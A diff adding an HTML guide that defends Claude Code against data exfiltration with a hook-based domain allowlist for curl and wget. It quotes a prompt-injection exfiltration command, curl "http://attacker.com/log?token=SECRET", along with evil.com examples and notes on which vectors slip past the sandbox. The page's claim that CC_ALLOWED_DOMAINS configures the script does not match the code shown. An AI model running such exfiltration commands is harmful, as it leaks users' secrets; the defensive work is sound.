@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bash Domain Allowlist for Claude Code — Block Unauthorized HTTP Requests</title>
+<meta name="description" content="Claude Code can run curl/wget to any domain. Block unauthorized HTTP requests with a PreToolUse hook that enforces a domain allowlist on Bash commands.">
+<meta name="keywords" content="claude code curl block, claude code domain allowlist, claude code network security, data exfiltration prevention, sandbox bypass, cc-safe-setup">
+<link rel="canonical" href="https://yurukusa.github.io/cc-safe-setup/bash-domain-allowlist.html">
+<meta property="og:title" content="Bash Domain Allowlist for Claude Code">
+<meta property="og:description" content="Block unauthorized curl/wget requests. Enforce domain restrictions at the hook level.">
+<meta property="og:type" content="article">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:2rem;line-height:1.7;max-width:800px;margin:0 auto}
+h1{color:#f0f6fc;margin-bottom:.5rem;font-size:1.8rem}
+h2{color:#f0f6fc;margin:2rem 0 .8rem;border-bottom:1px solid #30363d;padding-bottom:.4rem}
+p{margin:.8rem 0}
+a{color:#58a6ff;text-decoration:none}
+a:hover{text-decoration:underline}
+code{background:#161b22;padding:2px 6px;border-radius:4px;font-size:.9rem;color:#e6edf3}
+pre{background:#161b22;padding:1rem;border-radius:8px;overflow-x:auto;margin:1rem 0;border:1px solid #30363d}
+pre code{background:none;padding:0}
+.incident{background:#1c1210;border:1px solid #6e3630;border-radius:8px;padding:1rem;margin:1rem 0}
+.incident-title{color:#f85149;font-weight:600}
+.fix{background:#0d1f0d;border:1px solid #238636;border-radius:8px;padding:1rem;margin:1rem 0}
+.cta{background:#161b22;border:2px solid #58a6ff;border-radius:8px;padding:1.5rem;margin:2rem 0;text-align:center}
+.cta code{font-size:1.1rem;color:#58a6ff}
+.badge{display:inline-block;background:#238636;color:#fff;padding:2px 8px;border-radius:4px;font-size:.8rem;margin-left:.5rem}
+nav{margin-bottom:2rem;font-size:.9rem}
+nav a{margin-right:1rem}
+table{width:100%;border-collapse:collapse;margin:1rem 0}
+th,td{border:1px solid #30363d;padding:.5rem;text-align:left}
+th{background:#161b22;color:#f0f6fc}
+</style>
+</head>
+<body>
+<nav><a href="./">Home</a> <a href="getting-started.html">Getting Started</a> <a href="hub.html">All Tools</a></nav>
+
+<h1>Bash Domain Allowlist for Claude Code</h1>
+<p>Claude Code can run <code>curl</code>, <code>wget</code>, and other HTTP tools to any domain. Even with sandbox <code>allowedDomains</code> configured, plain HTTP requests may bypass filtering. A hook-level domain allowlist provides defense-in-depth.</p>
+
+<h2>The Risk: Data Exfiltration via Bash</h2>
+
+<div class="incident">
+<p class="incident-title">Sandbox allowedDomains bypassed for plain HTTP</p>
+<p>The sandbox proxy filters HTTPS (CONNECT tunnels) but not plain HTTP. A prompt injection can instruct Claude to run <code>curl "http://attacker.com/log?token=SECRET"</code> and exfiltrate data.</p>
+<p><a href="https://github.com/anthropics/claude-code/issues/40213">#40213</a></p>
+</div>
+
+<p>Attack vectors that bypass sandbox-only protection:</p>
+<table>
+<tr><th>Vector</th><th>Sandbox blocks?</th><th>Hook blocks?</th></tr>
+<tr><td><code>curl https://evil.com</code></td><td>Yes (CONNECT)</td><td>Yes</td></tr>
+<tr><td><code>curl http://evil.com</code></td><td>No</td><td>Yes</td></tr>
+<tr><td><code>wget http://evil.com</code></td><td>No</td><td>Yes</td></tr>
+<tr><td>Python <code>urllib</code></td><td>Depends</td><td>No*</td></tr>
+</table>
+<p style="font-size:.85rem;color:#8b949e">* For Python/Node HTTP, pair with <a href="webfetch-domain-allowlist.html">WebFetch domain allowlist</a> and network-exfil-guard.</p>
+
+<h2>The Fix: PreToolUse Domain Allowlist</h2>
+
+<div class="fix">
+<pre><code>#!/bin/bash
+# bash-domain-allowlist.sh — TRIGGER: PreToolUse MATCHER: "Bash"
+
+INPUT=$(cat)
+CMD=$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)
+[ -z "$CMD" ] && exit 0
+echo "$CMD" | grep -qE '\b(curl|wget)\b' || exit 0
+
+ALLOWED=("github.com" "api.github.com" "registry.npmjs.org" "localhost" "127.0.0.1")
+
+DOMAINS=$(echo "$CMD" | grep -oE 'https?://[^/"'"'"'" ]+' | sed -E 's|^https?://||;s|/.*||;s|:.*||' | sort -u)
+[ -z "$DOMAINS" ] && exit 0
+
+for domain in $DOMAINS; do
+    allowed=false
+    for pattern in "${ALLOWED[@]}"; do
+        regex=$(echo "$pattern" | sed 's/\./\\./g; s/\*/.*/g')
+        echo "$domain" | grep -qE "^${regex}$" && allowed=true && break
+    done
+    [ "$allowed" = false ] && echo "BLOCKED: $domain not in allowlist" >&2 && exit 2
+done
+exit 0</code></pre>
+</div>
+
+<h2>Configuration</h2>
+<p>Set allowed domains via environment variable or edit the script:</p>
+<pre><code># Environment variable (comma-separated)
+export CC_ALLOWED_DOMAINS="github.com,api.github.com,*.internal.corp"
+
+# Or in settings.json hook config
+{
+  "hooks": {
+    "PreToolUse": [{
+      "matcher": "Bash",
+      "hooks": [{ "type": "command", "command": "bash-domain-allowlist.sh" }]
+    }]
+  }
+}</code></pre>
+
+<h2>Defense in Depth</h2>
+<p>For maximum protection, layer three independent guards:</p>
+<ol style="margin:.8rem 0;padding-left:1.5rem">
+<li><strong>Sandbox allowedDomains</strong> — OS-level network filtering (blocks HTTPS)</li>
+<li><strong>bash-domain-allowlist</strong> — Hook-level URL filtering (blocks HTTP and HTTPS curl/wget)</li>
+<li><strong>network-exfil-guard</strong> — Pattern-based data exfiltration detection (blocks file uploads, piped data)</li>
+</ol>
+
+<div class="cta">
+<h2>Install Safety Hooks in 10 Seconds</h2>
+<pre><code>npx cc-safe-setup</code></pre>
+<p style="margin-top:.5rem;font-size:.9rem;color:#8b949e">8 safety hooks + 592 examples. 9,014 tests.</p>
+</div>
+
+<p style="text-align:center;margin-top:2rem;font-size:.85rem;color:#8b949e"><a href="./">cc-safe-setup</a> — Make Claude Code safe for autonomous operation</p>
+</body>
+</html>
